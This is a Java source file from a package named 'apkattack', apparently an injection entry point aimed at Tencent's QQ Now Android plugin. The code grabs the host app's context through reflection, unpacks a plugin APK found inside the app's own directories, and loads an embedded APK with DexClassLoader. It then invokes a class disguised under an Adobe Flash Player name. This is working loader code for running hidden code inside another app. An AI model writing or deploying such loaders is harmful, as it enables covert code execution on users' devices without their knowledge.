package com.example.apkattack;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;


//sla-cn.trustlook.com
@SuppressLint("SdCardPath") public class QQNowPlugin {

	//Lcom/tencent/mininow/MiniApplication;
	//Lcom/tencent/mininow/MiniNowMain;
	
	//Lcom/tencent/now_av_plugin/av/AVLoadManager;
	//Lcom/tencent/now_av_module/NowAVPluginApplication;
	//Lcom/tencent/now/AVProxyApplication;
	public static void QQNowPatchEntry(){
		String Tag = "QQNowPatchEntry";

		Log.e(Tag,"start");
		try {
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "get context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            }
	        }
			
	    	String dexmethodname = "start";
	    	
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
	    	
			String apppath = context.getFilesDir().getParent() + "/";

	    	String unzippath = apppath + "MyQQEntry/";
	
    		File unzippathfile = new File(unzippath);
    		if (unzippathfile.exists() == false) {
    			
    			unzippathfile.mkdirs();
    			
    			Log.e(Tag,"first run,make dir:" + unzippathfile.getAbsolutePath());
			}
    		
			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			if (unzipfiles == null || unzipfiles.length == 0) {
        		
        		String pluginpath = apppath + "files/ShadowPluginManager/UnpackedPlugin/Now/";

        		String destapkpath = "";
        		File [] pluginpathFiles = new File(pluginpath).listFiles();
        		
        		for (int i = 0; i < pluginpathFiles.length; i++) {
        			
        			String nextpath = pluginpathFiles[i].getName();
        			
					if (pluginpathFiles[i].isDirectory() && nextpath.length() == 32) {
						
						Log.e(Tag,"find next path:" + nextpath);
						
		        		String nextpluginpath = pluginpath + nextpath + "/nowplugin_2.zip/NowBiz.apk";
		        		File nextpluginpathFiles = new File(nextpluginpath);
		        		if (nextpluginpathFiles.exists() == true) {
		        			destapkpath = nextpluginpath;
		        			break;
						}
						
					}else if(pluginpathFiles[i].isFile() && nextpath.endsWith(".apk")){
						destapkpath = pluginpath + nextpath;
						break;
					}
				}       		
        		

		        ZipEntry zipEntry = null;
		        byte unzipbuf[] = new byte[0x10000];
		        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(destapkpath)));

	            while ( (zipEntry = zipIn.getNextEntry()) != null) {
	            	File unzipfile = new File(unzippath + zipEntry.getName());
	                if (zipEntry.isDirectory()) {
	                	unzipfile.mkdirs();
	                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
	                } else {
	                    File unzipparent = unzipfile.getParentFile();
	                    if (unzipparent.exists() == false) {
	                    	unzipparent.mkdirs();
	                    	
	                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
	                    }
	                    
	                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
	                    int readedBytes = 0;
	                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
	                        fileOut.write(unzipbuf, 0, readedBytes);
	                    }
	                    fileOut.close();
	                }
	                zipIn.closeEntry();
	            }
	            zipIn.close();
	            
	            Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"apk and config file already existing");
			}
			
			String apkfn = "simcard.apk";
			unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					Log.e(Tag, "find apk file:" + apkfn);
					break;
				}
			}
        	
        	
        	String appcachepath = context.getCacheDir() + "/";
        	
        	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "qq now load apk success");
		} catch (Exception e) {
			 Log.e(Tag, "qq now load apk exception");
			e.printStackTrace();
		}
	}
}
